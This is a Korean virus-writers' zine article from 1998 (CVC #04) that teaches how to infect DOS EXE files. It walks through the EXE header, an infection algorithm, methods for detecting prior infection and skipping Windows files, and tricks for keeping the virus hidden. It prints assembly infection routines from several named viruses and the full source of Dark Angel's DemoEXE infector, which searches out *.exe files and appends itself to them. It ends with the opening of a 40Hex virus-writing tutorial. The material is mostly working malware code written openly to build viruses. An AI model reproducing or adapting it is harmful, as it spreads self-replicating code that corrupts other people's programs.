
 특집 ! EXE 파일 감염 테크닉                                    CVC #04  98/05

------------------------------------------------------------------------> Crom

 * 자료 출처 : 여러 VX 관련 글, 하이텔 프전동

  지금까지 COM 파일 감염 바이러스에 대해서는 많이 다루었지만 국내에서는 EXE 파
일 감염 바이러스에 대해서는 정확히 작성된 글이 없었다. 대부분의 바이러스 제작자
들이 기존 바이러스를 분석하면서 얻은 지식으로 EXE 파일감염 바이러스를 제작했다.
나도 그런 사람중 하나였고 EXE 파일에 대한 구체적인 정보가 필요하다고 느꼈다. 그
래서 이글을 쓰게 되었고 EXE 파일에 감염되는 바이러스 분석에 다소의 도움이 되었
으면한다. 하지만, 이 내용이 EXE 감염 바이러스 제작에 완벽한 가이드가 된다고는
생각하지 않는다. 실제 적용은 CVC Zine #05 를 참고 하기 바란다. 거기에 아래의 내
용들이 실제로 적용된 바이러스 예제가 나올 것이다.

 * 왜 EXE 파일을 감염 시켜야 하나 ?

  당신이 윈도우 95 를 사용하고 있다면 현재 사용하는 COM 파일이 몇개나 있는가 ?
  COM 파일은 운영체제에서 지원하는것 빼고는 거의 없을 것이다. 심지어 많은 바이
러스의 공격대상이었던 COMMAND.COM 마저 EXE 파일 형태이다.
  빌게이츠는 "M$ 는 더이상 DOS 를 지원하지 않겠다." 라고 말했다. 하지만, 아직까
지 바이러스 제작의 대부분은 도스용 바이러스이다. 대부분의 프로그램이 EXE 파일로
되어 있으므로 바이러스가 널리 퍼지기 위해서는 EXE 파일이 가장 쉬운 타켓이다. 게
다가 윈도우에 포함된 COM 파일은 M$ 에서 자체 진단 기능을 넣어 버렸다.


* EXE 파일 구조

 START OFFSETS            DISCRIPTIONS                                     
 (hex) (dec)                                                               

  옵셋      내용
  -------   ---------------
  00         MZ(EXE 화일임을 나타낸다)
  02         헤더크기를 512 로 나눈 나머지
  04         헤더크기를 512 로 나눈 몫(나머지가 있으면 1 을 더한다)
  06         재배치관련
  08         패러그래프(16바이트)단위 의 헤더 크기
  0A         메모리관련..
  0C         메모리관련..
  0E         패러그래프단위의 스택의 위치
  10         스택의 주소
  12         체크섬
  14         IP 의 주소
  16         패러그래프 단위의 CS 의 위치
  1A         오버레이
  ..         나머진 재배치와 관련(Fixup Table).....
  -------   ---------------


   00 | 00 | 항상 MZ(4D 5A). EXE 파일의 마크
  *02 | 02 | Remainder after dividing load module's size by 512            
  *04 | 04 | 512 byte 페이지 단위의 파일크기
   06 | 06 | Number of relocation table entries                            
 @ 08 | 08 | Size of header in paragraphs (16 bytes)
   0A | 10 | Minumum number of paragraphs required after loaded program    
   0C | 12 | Maximum number of paragraphs required after loaded program    
  *0E | 14 | SS Offset of Stack Segment in Load module in paragraphs
  *10 | 16 | SP
   12 | 18 | Negative sum (ignore overflow) of all words in file (CRC)     
  *14 | 20 | IP
  *16 | 22 | CS
   18 | 24 | Offset of first relocation item.                              
   1A | 26 | 오버레이수. 오버레이가 존재하지 않으면 0 이다.

 * = 우리의 바이러스가 변형해야 한다.
 @ = EXE 헤더의 재설계가 필요하다.

  * CVC 에서 제시하는 EXE 파일 감염방법

  1. COM 인지 EXE 인지 검사한다. * EXE 헤더는 MZ 나 ZM 으로 시작한다.
  2. 감염 여부와 윈도우 파일인지 검사한다.
  3. 파일 끝으로 이동해 실제 파일 크기를 구한다.
  4. 내부 오버레이 EXE 파일인지 검사한다.
  5. 원래 EXE 헤더 정보를 저장한다.
  6. EXE 헤더를 변경한다.
  7. 포인터를 파일끝으로 이동해 바이러스를 쓴다.
  8. 파일 처음으로 포인터를 이동시킨다.
  9. 바뀐 EXE 헤더를 저장한다.

  여기서 3 의 경우 EXE 파일 길이를 얻을때 EXE 헤더에서 얻을 수도 있지만 내부오
버레이를 사용하는 EXE 파일일 경우 이 정보가 틀리게 되어 있으므로 정상적인 EXE
에 겹쳐써지게 된다. 이걸 피하기 위해서 우선 내부오버레이 EXE 인지 검사를 하고
전체 파일 길이에서 정보를 얻는다.

  *. COM 인지 EXE 인지 검사한다.

  간단하다 파일을 읽어 들인 버퍼를 검사해서 MZ 나 ZM 인지 검사한다. ZM 으로 시
작하는 EXE 파일도 있다고 하지만 지금까지 한번도 본적은 없다.

  *. 감염 여부 검사

  헤더에서 12h 의 경우 체크섬으로 사용된다. 하지만, 실제로 이 값은 사용되지 않
으므로 EXE 파일의 감염 여부를 검사 할때 사용될 수 있다. 단, 이 값만을 비교 할
때 이미 치료된 파일의 경우 체크섬 값이 변경되지 않으므로 변경되는 IP 값과 같
이 사용하는 것이 좋다.

  KOV 의 바이러스를 보면 IP 값과 특정 값을 XOR 시켜서 CRC 값에 넣어 둔다.

               mov     AL,byte ptr Buffer4F[14h]  ; 감염 여부 검사
               xor     al,5Ch
               cmp     byte ptr Buffer4F[12h],AL
               jz      Set_DT

  만약 치료 될 경우 IP 값이 변경되므로 파일이 치료되더라도 멍청하게 감염된걸로
착각하고 감염시키지 않는 오류를 범하지는 않는다.

  *. 윈도우 파일 검사

  KOV 는 헤더에서 정보를 얻어 NE 인지 검사한다. 이것은 윈도우 3.x 용 파일이고
윈도우 95 PE 이다. 따라서, 아래의 방식으로는 윈도우 95 파일은 감염시켜 버린다.

          mov     word ptr NEType,00         ; NE 타입의 EXE 파일인지 검사
          mov     dx, DS:[SI+60]             ; OS/2 & Windows
          mov     cx, DS:[SI+62]
          mov     ax,4200h
          Int     21h
          mov     cx,0002
          mov     dx, offset NEType          ; 읽기
          mov     ah,3Fh
          Int     21h
          cmp     word ptr DS:[NEType],'EN'  ; NE 이면 감염 제외
          jnz     ChkOVr                     ; 오버레이 인지 검사
          Jmp     Restore_DT

  개선된 것은 다음과 같다. 모든 윈도우용 파일은 몇가지 특징이 있다. 그중 한가
지를 사용한 것이다.

            cmp     byte ptr Buffer4F[18h],'@'
            jnz     ChkOvr
            Jmp     Restore_DT

0100  4D 5A 90 00 03 00 00 00-04 00 00 00 FF FF 00 00   MZ..............
0110  B8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00   ........@.......

                              ^-- 윈도우 파일 표시자            ^

0120  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0130  00 00 00 00 00 00 00 00-00 00 00 00 80 00 00 00   ................
0140  0E 1F BA 0E 00 B4 09 CD-21 B8 01 4C CD 21 54 68   ........!..L.!Th
0150  69 73 20 70 72 6F 67 72-61 6D 20 63 61 6E 6E 6F   is program canno
0160  74 20 62 65 20 72 75 6E-20 69 6E 20 44 4F 53 20   t be run in DOS
0170  6D 6F 64 65 2E 0D 0D 0A-24 00 00 00 00 00 00 00   mode....$.......
0180  50 45 00 00 4C 01 05 00-9B C7 5B 30 00 00 00 00   PE..L.....[0....

  위의 내용은 윈도우 95 용 파일이다. 처음이 MZ 로 시작하므로 EXE 파일임을 알수
있고, 118h 에 @ (40h) 가 존재함을 알 수 있다. 그리고, 도스에서 실행 할수 없다
는 메시지 밑에 PE 파일임을 표시하는 PE 가 존재한다.
  몇몇 윈도우 파일은 @ 표시가 존재하지 않기도 한다. 하지만, New EXE 파일을 나
타내는 NE나 PE 는 존재하며 내부 오버레이 EXE 파일 검사 부분에서 윈도우 파일은
내부 오버레이 EXE 로 여겨 지므로 감염에서 제외 시킬 수 있다.

  *. 내부 오버레이 EXE 파일인가 ?

  EXE 파일중 일부 파일은 헤더 정보와 실제 파일 길이가 틀린 경우가 존재한다. 초
기 바이러스들은 헤더에서만 정보를 얻어와서 정상적인 파일에 바이러스를 겹쳐써버
리는 경우가 많았다. 감염된 EXE 파일의 복구가 불가능한것은 물론이다.
  이런 류의 파일들은 내부 오버레이를 사용하는 EXE 파일들이 많았다. 내부오버레
이는 1Ah 값이 0 이 아닐 경우이지만 0 이면서 내부오버레이 파일인 경우도 많다.
  또한 이 방법은 윈도우용 파일을 감염시키지 않는 역할도 한다.

 Chk_OVREXE:
               mov     al,02                 ; 파일 끝으로 이동
               call    SetPnt

 Chk_OverEXE:
               Push    DX                    ; 길이 저장
               Push    AX
               Mov     AX,[SI+04]            ; 04: 페이지 단위의 길이
               Mov     DI,[SI+02]            ; 02: 나머지
               Or      DI,DI                 ; 나머지가 있는가?
               jz      No_DEC
               dec     AX                    ; -1
 no_DEC:       Mov     CX,0200h              ; * 512
               Mul     CX                    ; AX * 512 = DX:AX
               Add     AX,DI                 ; 남아있는값 더하기.
               Adc     DX,+00                ; 자리수 올리기
               Pop     DI                    ; AX 값
               cmp     DI,AX                 ; 비교
               Pop     DI                    ; DX 값
               Jnz     Set_DT
               Cmp     DI,DX
               jnz     Set_DT                ; 실제길이와 다르면 감염제외


  * EXE 헤더 변경 알고리즘

  EXE 헤더 수정은 크게 페러그래프 단위의 헤더와 CS,IP,SS,SP 설정으로 나뉜다.

  * 패러그래프 단위의 헤더 크기

  1. 헤더의 크기를 구한 다음 헤더의 크기를 바이트로 바꾼다. (패러그래프로 저장
     되어 있는데 패러그래프는 16 바이트 이다.)
  2. 파일 크기에서 헤더의 크기를 뺀다.
  3. 이걸 다시 패러그래피로 바꾼다.

  이런 과정을 거치는 것은 EXE 파일 감염 바이러스는 EXE 파일의 가장 마지막에 바
  이러스가 기생하므로 EXE 파일의 시작을 파일 끝으로 설정하기 위함이다.

  * CS,IP,SS,SP 설정

  1. 파일 크기에 바이러스를 더한다.
  2. 그 값을 512 로 나눈다. (페이지 하나당 512 바이트 이다.)
  3. 나머지가 0 이 아니라면 페이지 올림을 해야 한다.
  4. 바이러스에서 사용할 CS,IP,SS,SP 를 헤더에 저장한다.

  EXE 헤더 변경의 경우 대략 2 가지 방법이 있다.
  아래에 보면 Wanderer.M 과 Wanderer.II 가 사용한 방법이 틀린 것을 알 수 있다.
  Wanderer.M 은 파일 길이에 따라 IP 값이 가변적으로 변하지만 Wanderer.II 의 경
우 IP 값이 항상 고정된다. 패러그래프 단위의 헤더 크기 변경하는 시점을 유심히 보
기 바란다.

* EXE 파일 감염의 예 (1) - Wanderer.M

 ;<><><><><><><><><><><><><><><><><><><><><><>
 ;    EXE 파일 감염
 ;<><><><><><><><><><><><><><><><><><><><><><>

 Infect_EXE:
               mov     si, OFFSET Buffer4F   ; SI=파일 버퍼위치
               NOP
 Chk_OVREXE:
               mov     al,02                 ; 파일 끝으로 이동
               call    SetPnt

 Chk_OverEXE:
               Push    DX                    ; 길이 저장
               Push    AX
               Mov     AX,[SI+04]            ; 04: 페이지 단위의 길이
               Mov     DI,[SI+02]            ; 02: 나머지
               Or      DI,DI                 ; 나머지가 있는가?
               jz      No_DEC
               dec     AX                    ; -1
 no_DEC:       Mov     CX,0200h              ; * 512
               Mul     CX                    ; AX * 512 = DX:AX
               Add     AX,DI                 ; 남아있는값 더하기.
               Adc     DX,+00                ; 자리수 올리기
               Pop     DI                    ; AX 값
               cmp     DI,AX                 ; 비교
               Pop     DI                    ; DX 값
               Jnz     Set_DT
               Cmp     DI,DX
               jnz     Set_DT                ; 실제길이와 다르면 감염제외
               Push    AX                    ; 저장
               Push    DX

               Push    SI                    ; File buffer
               mov     si, offset Buffer4F+0Eh    ; SS
               mov     di, offset EXE_SS     ;
               mov     cx,0010
               repz    movsb
               Pop     SI                    ; File Buffer
               xor     DI,DI

               Mov     CX,0010h              ; / 16
               Div     CX
               Sub     AX,[SI+08]            ; 헤더길이(파라그래프 단위)
               Mov     [SI+16h],AX           ; CS 값
               Mov     [SI+0Eh],AX

               push    DX
               mov     word ptr EXE_Start+1,DX
               add     dx, offset EXE_Start
               Mov     [SI+14h],DX           ; IP값
               Pop     DX
               Add     DX,offset Stack_Space ; 스택값 설정
               Mov     [SI+10h],DX           ; SP값

               Pop     DX                    ; 원래 길이
               Pop     AX
               Add     AX, offset End_Virus  ; + 바이러스 길이
               Adc     DX,+00
               Mov     CX,0200h              ; /512
               div     CX
               Or      DX,DX                 ; 나머지?
               jz      Y_Inc
               inc     AX
 Y_Inc:        mov     [SI+04],AX            ; 길이
               mov     [SI+02],DX            ; 나머지

               mov     AL,byte ptr [SI+14h]
               xor     al,5Ch
               mov     BYTE PTR [SI+12h],AL  ; 12:체크섬, 감염여부


 * EXE 파일 감염의 예 (2) : ?

     mov     ah,3fh                 ; 파일로 부터 읽기 BTW: BX=File Handle
     mov     cx,1ch                 ; 1Ch Bytes (28) 읽기
     mov     dx,offset ds:[buffer]  ;
     int     21h                    ;
     jc      error_exit             ; 에러면 Exit Routine 점프

 buffer  db      1Ch DUP (?)        ; 버퍼
 exe_ip  dw      0       ; EXE 헤더로 부터 원래 정보를 저장할 곳이다.
 exe_cs  dw      0       ;
 exe_sp  dw      0       ;
 exe_ss  dw      0       ;

 다음, 처음 1Ch (28) 바이트를 읽은 후 포인터를 끝으로 옮긴다.
                                                                           
     mov     ax,4202h        ; 파일 끝으로 이동
     xor     cx,cx           ; 오프셋 더하기 (CX:DX)!
     xor     dx,dx           ;
     int     21h             ;
     jc      error_exit      ; 역시 에러면 점프
                                                                           
 끝으로 이동한 후 감염과정을 실행할 수 있다.

 ; 기억하기 BX = File Handle  DX:AX Pointer Location (EOF)
     cmp    word ptr cs:[buffer],5A4Dh  ; EXE 파일 ?
     jnz    error_exit           ; EXE 파일이 아닐때
     mov    cx,word ptr cs:[buffer+14h]  ; IP 레지스터 읽기
     mov    word ptr cs:[exe_ip],cx      ; IP Register 저장
     mov    cx,word ptr cs:[buffer+16h]  ; CS Register 읽기
     mov    word ptr cs:[exe_cs],cx      ; CS Register 저장
     mov    cx,word ptr cs:[buffer+10h]  ; SP Register 읽기
     mov    word ptr cs:[exe_sp],cx      ; SP Register 저장
     mov    cx,word ptr cs:[buffer+0Eh]  ; SS Register 읽기
     mov    word ptr cs:[exe_ss],cx      ; SS Register 저장
                                                                           
 새 CS:IP 와 SS:SP 레지스터를 찾은 후 새로운 세그먼트를 만든다. 그리고,
 CS:IP 는 바이러스 시작으로 옮겨진다. 바이러스 시작위치가 바이러스의 첫 바이트
 가 아니라면 AX 에 더하면 된다.

     push   ax
     push   dx                                                             
     call   Find_New_Offsets     ;Refer to it at the END of this Text      
     sub    dx,word ptr cs:[buffer+8h]  ; EXE header! - CS
     mov    word ptr cs:[buffer+16h],dx ; new CS Register 저장
     mov    word ptr cs:[buffer+14h],ax ; new IP Register 저장
     pop    dx                                                             
     pop    ax           ; Original DX:AX Point Location 복구 (EOF)
     add    ax,virus_size      ; .STACKs 은 보통 EXE 코드 끝에 있다. 우리의
                               ; 바이러스가 끝에 있기 때문에 반드시 바이러스
                               ; 뒤로 이동해야 한다.
     adc    dx,0         ;Add with Carry Flag!                             
     push   ax                                                             
     push   dx                          ; new EOF pointer Location 저장
     call   Find_New_Offsets            ; NEW SS:SP offsets 얻기
     sub    dx,word ptr cs:[buffer+8h]  ; 파일 크기에서 EXE header 얻기
     add    ax,40h                      ;Move Stacks a little after EOF    
     mov    word ptr cs:[buffer+0Eh],dx ; SS Register 저장
     mov    word ptr cs:[buffer+10h],ax ; SP Register 저장
     pop    dx                                                             
     pop    ax                   ; 원래 파일 EOF 를 복구한다.
     push   bx                                                             
     push   cx                   ; Shifting bits 명령은 / 나 * 보다 속도가 빠름
     mov    cl,7                 ;In Simple, here we are figuring out      
     shl    dx,cl                ;the New File Size in 512byte pages       
     add    bx,ax                ;Now Rather than using the DIV and        
     mov    cl,9                 ;MOD function, I used this one because    
     shr    bx,cl                ;It is alot FASTER for the Processor!     
     add    dx,bx                ;The Result is exactly same, But          
     and    ax,1FFh              ;Shifting bits, results of the            
     jz     Its_Even             ;Same function when dealing with base     
     inc    dx                   ;16 numbers!                              
 Its_Even:            ;Read PeterNorton's Advanced ASM Language for        
     pop    cx        ;more neat short cuts for the above!                 
     pop    bx                                                             
     mov    word ptr cs:[buffer+2h],ax   ;Remainder after of 512 pages     
     mov    word ptr cs:[buffer+4h],dx   ;New File Size in 512 pages       
 Now we are Ready to write the virus to the EXE File! (Yeah!)              
     mov    ah,40h                 ; 쓰기
     mov    dx,offset init_Virus   ; 바이러스 시작위치
                                   ;
     mov    cx,Virus_size          ; 바이러스 크기
     int    21h                                                            
     jc     error_exit             ; 에러 ?
     mov    ax,4200h               ; EXE 파일의 처음으로 이동
     xor    cx,cx                  ;
     xor    dx,dx                  ;
     int    21h                                                            
     mov    ah,40h                 ; 파일에 쓰기
     mov    dx,offset ds:[buffer]  ; 변형한 EXE 헤더 쓰기
     mov    cx,1Ch                 ; CX=헤더 크기
     int    21h                    ;Do it!
                                                                           
 ;  finds new Offsets for CS:IP & SS:SP Registers                          

 Find_New_Offsets        PROC    NEAR
         push    bx                                                        
         push    cx                                                        
         mov     cl,0Ch              ;(c) Rock Steady/NuKE                 
         shl     dx,cl               ; I'm dividing here....               
         mov     bx,ax                                                     
         mov     cl,4                ; And multiply by 16 hear             
         shr     bx,cl                                                     
         add     dx,bx                                                     
         and     ax,0Fh                                                    
         pop     cx                                                        
         pop     bx                                                        
         retn                                                              
 Find_New_Offsets        ENDP                                              
                         Rock Steady / NuKE                                


 * EXE 파일 감염 예 (3) : Wanderer.II

;<><><><><><><><><><><><><><><><><><><><><><>
;         EXE 파일 감염
;<><><><><><><><><><><><><><><><><><><><><><>

 Infect_EXE:
          mov     word ptr NEType,00         ; NE 타입의 EXE 파일인지 검사
          mov     dx, DS:[SI+60]             ; OS/2 & Windows
          mov     cx, DS:[SI+62]
          mov     ax,4200h
          Int     21h
          mov     cx,0002
          mov     dx, offset NEType          ; 읽기
          mov     ah,3Fh
          Int     21h
          cmp     word ptr DS:[NEType],'EN'  ; NE 이면 감염 제외
          jnz     ChkOVr                     ; 오버레이 인지 검사
          Jmp     Restore_DT

 ChkOVR:
          NOP
          mov     ax, DS:[SI+04h]            ; 실제길이와 헤더길이와 비교
          cmp     word ptr [SI+02h],00       ; (내부 오버레이 EXE 파일은
          jz      MUL_200                    ; 감염제외됨)
          DEC     AX
 Mul_200: mul     word ptr Mul200
          add     ax,[SI+02h]
          ADC     dx,+00
          cmp     word ptr FileSize,AX
          jz      ChkSize_2
          JMP     Restore_DT
 ChkSize_2:
          cmp     word ptr FileSize+2,DX
          jz      Chk_EXEinfected            ; 감염 여부 판단
          JMP     Restore_DT

 Chk_EXEinfected:
          cmp     word ptr [SI+12h],0F070h   ; 감염여부는 두가지가 사용된다.
          jnz     Modify_EXE
          cmp     word ptr [SI+14h],offset EXE_Start ; IP값
          jnz     Modify_EXE
          jmp     InfectedTime               ; 이미 감염되었음. 초는 스텔스를
                                             ; 위해 바꿈 (혹시 바뀌었을수도
                                             ; 있으므로)
 Modify_EXE:
          mov     word ptr [SI+12h],0F070h   ; 감염 식별자 쓰기
          Push    CS
          Pop     DS
          mov     si, offset Buffer4F[0Eh]   ; 헤더 내용 복사시킴
          mov     di, offset EXE_SS
          mov     cx,0010
          repz    movsb

          call    Get_RandomAL               ; 난수값을 AL 로 불러들임
          mov     byte ptr Ra_Time[1],al     ; 암호키
          xor     byte ptr ds:[E_loop],08    ; INC AX/DEC AX 로 변환
          push    cs
          pop     es
          call    EXE_DATA_ENCRY             ; EXE 데이터값 암호화

          mov     al,02                      ; 파일 끝으로 가기
          call    SetPnt

          NOP                                ; 맥가이버것을 사용했음
          mov     cx,ax                      ; 16의 배수로 만들기
          add     ax,0010h                   ;
          adc     dx,+00
          and     ax,0FFF0h                  ; 16 의 배수로 만들기

          Push    AX                         ; FileSize
          Push    DX                         ; FileSize[2]
          and     cx,000Fh                   ; 이부분이 특정 길이만큼
          ADD     cx,offset End_Virus        ; 증가하게 하는것임. (바
          add     ax,cx                      ; 이러스 길이 보다는 +16됨)
          adc     dx,+00
          mov     word ptr FileSize,ax
          mov     word ptr FileSize[2],dx
          mov     cx,0200h                   ; /512
          div     cx
          or      dx,dx                      ; 나머지가 있는가?
          jz      No_inc
          inc     ax
 No_inc:  mov     word ptr Buffer4F[2],dx
          mov     word ptr Buffer4F[4],ax

          Pop     DX                         ; FileSize+2
          Pop     AX                         ; FileSize
          Push    AX
          Push    DX
          mov     cx,0010h                   ;
          div     cx                         ;
          sub     ax,word ptr Buffer4F[08h]  ;
          mov     word ptr Buffer4F[14h],offset EXE_start
          mov     word ptr Buffer4F[16h],ax  ; 계산된 세그먼트
          mov     word ptr Buffer4F[0Eh],ax
          mov     word ptr Buffer4F[10h],offset End_Virus

          mov     al,00
          call    SetPnt

          mov     al,40h                     ; EXE 헤더 내용 쓰기
          mov     cx,001ch
          mov     dx,offset Buffer4F
          call    callInt21

          mov     ax,4200h
          Pop     CX                         ; FileSize
          Pop     DX                         ; FileSize+2
          int     21h

          mov     ah,40h                     ; 바이러스 쓰기
          mov     cx,offset End_Virus
          xor     dx,dx
          Int     21h

          mov     ax,4200h
          mov     dx,word ptr FileSize
          mov     cx,word ptr FileSize[2]
          int     21h

          mov     ah,40h                     ; 뒷부분은 버림
          xor     cx,cx
          Int     21h
          jmp     InfectedTime


 * EXE 파일 감염 예 (4) : Dark Angel 의 소스

  .model tiny                             ;
  .code                                   ; Virus code segment
            org 100h                      ; COM 파일 시작 IP
  ; Cheesy EXE infector
  ; Written by Dark Angel of PHALCON/SKISM
  ; For 40Hex Number 8 Volume 2 Issue 4
  id = 'DA'                               ; EXE 감염 ID word

  startvirus:                             ; 바이러스 시작
            call next                     ; delta offset 계산한다.
  next:     pop  bp                       ; bp = IP next
            sub  bp,offset next           ; bp = delta offset (바이러스 시작점)

            push ds
            push es
            push cs                       ; DS = CS
            pop  ds
            push cs                       ; ES = CS
            pop  es
            lea  si,[bp+jmpsave2]
            lea  di,[bp+jmpsave]
            movsw
            movsw
            movsw
            movsw

            mov  ah,1Ah                   ; 새 DTA 설정
            lea  dx,[bp+newDTA]           ; 새 DTA @ DS:DX 주소
            int  21h

            lea  dx,[bp+exe_mask]         ; *.exe
            mov  ah,4eh                   ; 파일 찾기
            mov  cx,7                     ; 속성
  findfirstnext:
            int  21h                      ; DS:DX
            jc   done_infections          ; 파일을 찾을 수 없다.

            mov  al,0h                    ; 읽기 전용 오픈
            call open

            mov  ah,3fh                   ; 버퍼에 읽기
            lea  dx,[bp+buffer]           ; @ DS:DX
            mov  cx,1Ah                   ; 1Ah 바이트
            int  21h

            mov  ah,3eh                   ; 파일 닫기
            int  21h

  checkEXE: cmp  word ptr [bp+buffer+10h],id ; 이미 감염되었나 ?
            jnz  infect_exe
  find_next:
            mov  ah,4fh                   ; 다음 파일 찾기
            jmp  short findfirstnext
  done_infections:
            mov  ah,1ah                   ; 기본 DTA 로 재설정
            mov  dx,80h                   ; DTA in PSP
            pop  es
            pop  ds                       ; DS->PSP
            int  21h
            mov  ax,es                    ; AX = PSP 세그먼트
            add  ax,10h                   ; + 10h (PSP)
            add  word ptr cs:[si+jmpsave+2],ax
            add  ax,word ptr cs:[si+stacksave+2]
            cli                           ;
            mov  sp,word ptr cs:[si+stacksave]
            mov  ss,ax
            sti
            db   0eah                     ; jmp ssss:oooo
  jmpsave             dd ?                ; Original CS:IP
  stacksave           dd ?                ; Original SS:SP
  jmpsave2            dd 0fff00000h       ; Needed for carrier file
  stacksave2          dd ?

  creator             db '[MPC]',0,'Dark Angel of PHALCON/SKISM',0
  virusname           db '[DemoEXE] for 40Hex',0

  infect_exe:
            les  ax, dword ptr [bp+buffer+14h] ; 옛 CS:IP 저장
            mov  word ptr [bp+jmpsave2], ax
            mov  word ptr [bp+jmpsave2+2], es

            les  ax, dword ptr [bp+buffer+0Eh] ; old stack 저장
            mov  word ptr [bp+stacksave2], es
            mov  word ptr [bp+stacksave2+2], ax

            mov  ax, word ptr [bp+buffer + 8] ; header size 얻기
            mov  cl, 4                        ; 바이트로 변환
            shl  ax, cl                       ; AX * (2^4) --> AX * 16
            xchg ax, bx

            les  ax, [bp+offset newDTA+26]; 파일 크기 얻기
            mov  dx, es                   ; to DX:AX
            push ax
            push dx

            sub  ax, bx                   ; 파일 사이즈 에서 헤더 사이즈 빼기
            sbb  dx, 0                    ;

            mov  cx, 10h                  ; segment:offset 형식으로 변환
            div  cx                       ;

            mov  word ptr [bp+buffer+14h], dx ; 새 CS,IP
            mov  word ptr [bp+buffer+16h], ax

            mov  word ptr [bp+buffer+0Eh], ax ; 스택 추가
            mov  word ptr [bp+buffer+10h], id

            pop  dx                       ; 파일 길이 얻기
            pop  ax

            add  ax, heap-startvirus      ; 바이러스 크기 추가
            adc  dx, 0

            mov  cl, 9                    ; 2**9 = 512
            push ax
            shr  ax, cl
            ror  dx, cl
            stc
            adc  dx, ax                   ; 페이즈로 파일 크기
            pop  ax
            and  ah, 1                    ; mod 512

            mov  word ptr [bp+buffer+4], dx ; 새 파일 크기
            mov  word ptr [bp+buffer+2], ax

            push cs                       ; ES 복구
            pop  es

            mov  cx, 1ah
  finishinfection:
            push cx                       ; Save # bytes to write
            xor  cx,cx                    ; 속성을 읽기 쓰기로
            call attributes               ;

            mov  al,2                     ; 읽기/쓰기로 오픈
            call open

            mov  ah,40h                   ; 파일에 쓰기
            lea  dx,[bp+buffer]           ; 버퍼에 쓰기
            pop  cx                       ; cx 바이트
            int  21h

            mov  ax,4202h                 ; 포인터 이동
            xor  cx,cx                    ; 파일의 끝
            cwd                           ; = xor dx,dx
            int  21h

            mov  ah,40h                   ; 바이러스 쓰기
            lea  dx,[bp+startvirus]
            mov  cx,heap-startvirus       ; # bytes to write
            int  21h

            mov  ax,5701h                 ; 원래 파일 작성 날짜/시간 복구
            mov  cx,word ptr [bp+newDTA+16h] ; time
            mov  dx,word ptr [bp+newDTA+18h] ; date
            int  21h

            mov  ah,3eh                   ; 파일 닫기
            int  21h

            mov ch,0
            mov cl,byte ptr [bp+newDTA+15h] ; 원래 속성 복구
            call attributes                 ;

  mo_infections: jmp find_next

  open:
            mov  ah,3dh
            lea  dx,[bp+newDTA+30]        ; 오픈
            int  21h
            xchg ax,bx
            ret

  attributes:
            mov  ax,4301h                 ; 파일 속성 세팅
            lea  dx,[bp+newDTA+30]        ;
            int  21h
            ret

  exe_mask            db '*.exe',0
  heap:                                   ; Variables not in code
  newDTA              db 42 dup (?)       ; 새 DTA 버퍼
  buffer              db 1ah dup (?)      ; 읽을 버퍼
  endheap:                                ; 바이러스 끝

  end       startvirus


 * 원래 프로그램으로 점프

  EXE 헤더의 세그먼트는 EXE 파일에서의 값이고 실제 메모리에서는 EXE 파일에서
의 절대적인 주소와 함께 현재의 PSP 세그먼트의 값이 더해진다.
  아래에서도 CS 값과 SS 값에 ES (PSP) 을 더해 주고 있다.
  바이러스가 기억장소에 무사히 상주 했거나 감염을 다 시키고 원래 프로그램으로
제어권을 넘기기 위해서 보통 아래와 같은 방법을 사용한다.

            mov  ax,es                    ; AX = PSP 세그먼트
            add  ax,10h                   ; + 10h (PSP)
            add  word ptr cs:[si+jmpsave+2],ax
            add  ax,word ptr cs:[si+stacksave+2]
            cli                           ;
            mov  sp,word ptr cs:[si+stacksave]
            mov  ss,ax
            sti
            db   0eah                     ; jmp ssss:oooo
  jmpsave             dd ?                ; Original CS:IP
  stacksave           dd ?                ; Original SS:SP
  jmpsave2            dd 0fff00000h       ; Needed for carrier file
  stacksave2          dd ?

 * 그외 다른 EXE 파일 감염 방법

 1. EXE 헤더에 겹쳐쓰기

  EXE 파일 중 EXE 헤더와 실제 프로그램 시작 사이에 빈공간이 존재하는 파일이 있
다.이 부분을 바이러스가 겹쳐쓰기를 하는데 이들 바이러스를 ExeHeader 라고 부르고
있다. 국내에서 발견된 BootEXE.451 와 SkidRow 가 대표적인 예이다. 하지만, 이 바
이러스의 단점이라면 EXE 파일 크기가 64 KB 로 한정되어 있고 감염 시킬 수 있는 EXE
파일이 한정된다는 거다. 그리고, 감염 방법도 보통의 기생형 바이러스와는 틀리다.
CVC 에서도 이런 류의 바이러스를 제작할 예정이다. 하지만, 보통 인터럽트 13h 를 가
로채는 이들 바이러스는 윈도우의 도스창에서는 제대로 작동하지 않으므로 구현이외
에는 가치가 없다.


 2. DOS 섹션에 겹쳐쓰기

  New EXE 파일의 경우 DOS 에서 실행하면 이 프로그램은 도스에서는 실행 안된다
와 같은 메시지를 볼 수 있을 것인다. 이를 출력하기 위해서 약간의 용량이 사용된
다. 이 부분에 감염 시키는 바이러스들이 최근 선보이고 있다. CVC 도 이런 아이디
어를 받아 들여 곧 이런 바이러스를 제작해 공개할 예정이다. 이 역시 조금만 기다
려 주기 바란다. 하지만, 윈도우 95 의 경우 윈도우 파일을 실행하면 도스 영역이 실
행되지 않고 윈도우 프로그램이 바로 실행된다. 바이러스가 실행되기 위해서는 순수
도스 모드가 필요하다는 문제점이 존재한다.

 * 마치면서

  EXE 파일 감염에 대해서 이해가 되었는지 모르겠다. CVC 는 이에 만족하지 않고
New EXE 파일감염에 대해서도 연구할 예정이다. 이 역시 새로운 것이기 때문에 시
간이 오래 걸릴지 모르겠지만 이미 외국의 VX 들이 공개한 영문 자료가 있으므로
그렇게 어렵지는 않을 것이다. CVC #05 부터는 EXE 파일을 감염 시키는 바이러스를
본격적으로 선보일 예정이다. 앞으로 COM 파일 감염은 테스트용을 제외 하고는 제
작하지 않을 예정이다.

* 보너스

  아래는 Phalcon/Skism 의 Dark Angel 이 쓴 바이러스 제작 강좌이다.

40Hex Number 8 Volume 2 Issue 4                                       File 007

                    ***************************************
                    An Introduction to Nonoverwriting Virii
                            Part II: EXE Infectors
                                 By Dark Angel
                    ***************************************

       In the  last issue  of 40Hex,  I presented  theory and  code  for  the
  nonoverwriting  COM   infector,  the   simplest  of  all  parasitic  virii.
  Hopefully, having  learned COM  infections cold,  you are now ready for EXE
  infections.  There is a grey veil covering the technique of EXE infections,
  as the majority of virii are COM-only.

       EXE infections  are, in  some  respects,  simpler  than  COM  viruses.
  However, to  understand the infection, you must understand the structure of
  EXE files  (naturally).   EXE files  are structured into segments which are
  loaded consecutively  atop one  another.  Thus, all an EXE infector must do
  is create  its own  segment in  the EXE  file and  alter  the  entry  point
